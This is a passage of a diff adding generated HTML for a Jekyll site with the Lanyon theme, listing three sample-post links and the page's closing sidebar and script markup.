+        <h3>
+          <a href="/2020/04/03/introducing-lanyon/">
+            Introducing Lanyon
+            <small>03 Apr 2020</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2020/04/02/example-content/">
+            Example content
+            <small>02 Apr 2020</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2020/04/01/whats-jekyll/">
+            What's Jekyll?
+            <small>01 Apr 2020</small>
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+      </div>
+    </div>
+
+    <label for="sidebar-checkbox" class="sidebar-toggle"></label>
+
+    <script src='/public/js/script.js'></script>
+  </body>
+</html>
